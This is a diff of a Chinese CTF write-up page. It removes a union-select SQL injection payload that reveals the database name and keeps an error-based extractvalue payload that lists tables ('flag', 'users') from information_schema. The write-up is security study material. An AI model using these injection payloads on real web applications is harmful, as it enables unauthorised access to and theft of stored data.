@@ -112,10 +112,6 @@
 
 <p>4.爆库</p>
 <p>得到是ctf</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,database(),4#</span><br></pre></td></tr></table></figure>
-
-
-
 <p>3.爆表名</p>
 <p>得到flag,users</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;),0x7e)),4#</span><br></pre></td></tr></table></figure>
